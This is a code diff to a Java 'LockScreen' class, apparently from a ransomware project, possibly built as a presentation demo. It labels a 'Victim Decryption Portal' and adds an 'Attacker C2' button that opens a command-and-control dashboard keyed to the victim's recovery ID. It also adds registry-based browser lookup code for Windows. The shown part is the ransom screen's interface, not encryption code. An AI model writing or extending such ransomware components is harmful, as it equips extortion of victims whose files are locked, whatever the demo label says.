@@ -475,11 +475,24 @@ public final class LockScreen {
 
         checkPaymentButton = new JButton("Check Payment");
         styleActionButton(checkPaymentButton, new Color(180, 180, 180), Color.BLACK);
+        checkPaymentButton.setToolTipText("Open Victim Decryption Portal in browser");
         checkPaymentButton.addActionListener(e -> {
             openBrowser(getPortalUrlWithRid());
             statusMessageLabel.setText("Opening Recovery Portal in browser...");
         });
         buttonsPanel.add(checkPaymentButton);
+
+        JButton attackerC2Btn = new JButton("Attacker C2");
+        styleActionButton(attackerC2Btn, new Color(124, 58, 237), Color.WHITE);
+        attackerC2Btn.setToolTipText("Open Attacker C2 Dashboard in browser (Presentation Demo)");
+        attackerC2Btn.addActionListener(e -> {
+            String c2Url = portalUrl;
+            if (!c2Url.endsWith("/")) c2Url += "/";
+            c2Url += "c2.html?rid=" + recoveryId;
+            openBrowser(c2Url);
+            statusMessageLabel.setText("Opening Attacker C2 Dashboard in browser...");
+        });
+        buttonsPanel.add(attackerC2Btn);
 
         decryptButton = new JButton("Decrypt");
         styleActionButton(decryptButton, new Color(220, 40, 40), Color.WHITE);
@@ -697,12 +710,77 @@ public final class LockScreen {
         return dt.format(DateTimeFormatter.ofPattern("M/d/yyyy HH:mm:ss"));
     }
 
-    private static void openBrowser(String url) {
+    public static void openBrowser(String url) {
+        try {
+            String browser = findBrowserExecutable();
+            if (browser != null && !browser.isBlank()) {
+                String flag = browser.toLowerCase().contains("firefox") ? "-new-window" : "--new-window";
+                new ProcessBuilder(browser, flag, url).start();
+                return;
+            }
+        } catch (Exception ignored) {}
+
         try {
             Desktop.getDesktop().browse(new URI(url));
         } catch (Exception e) {
             System.err.println("[LockScreen] Cannot open browser: " + e.getMessage());
         }
+    }
+
+    private static String findBrowserExecutable() {
+        // 1. Query registry for default browser ProgId
+        try {
+            Process p = new ProcessBuilder("reg", "query",
+                "HKCU\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice",
+                "/v", "ProgId").start();
+            String out = new String(p.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
+            for (String line : out.split("\r?\n")) {
+                if (line.contains("ProgId") && line.contains("REG_SZ")) {
+                    String progId = line.substring(line.indexOf("REG_SZ") + 6).trim();
+                    if (!progId.isBlank()) {
+                        Process p2 = new ProcessBuilder("reg", "query",
+                            "HKCR\\" + progId + "\\shell\\open\\command", "").start();
+                        String out2 = new String(p2.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
+                        for (String l2 : out2.split("\r?\n")) {
+                            if (l2.contains("REG_SZ")) {
+                                String cmd = l2.substring(l2.indexOf("REG_SZ") + 6).trim();
+                                String candidate = extractExePath(cmd);
+                                if (candidate != null && java.nio.file.Files.exists(java.nio.file.Paths.get(candidate))) {
+                                    return candidate;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
+
+        // 2. Common browser paths
+        String[] candidates = {
+            "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
+            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+            "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
+            System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\Application\\chrome.exe",
+            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+            "C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe"
+        };
+        for (String c : candidates) {
+            if (c != null && java.nio.file.Files.exists(java.nio.file.Paths.get(c))) {
+                return c;
+            }
+        }
+        return null;
+    }
+
+    private static String extractExePath(String cmd) {
+        if (cmd == null || cmd.isBlank()) return null;
+        if (cmd.startsWith("\"")) {
+            int end = cmd.indexOf("\"", 1);
+            if (end > 1) return cmd.substring(1, end);
+        }
+        int space = cmd.indexOf(" ");
+        if (space > 0) return cmd.substring(0, space);
+        return cmd;
     }
 
     private static void showInfoDialog(String title, String message) {
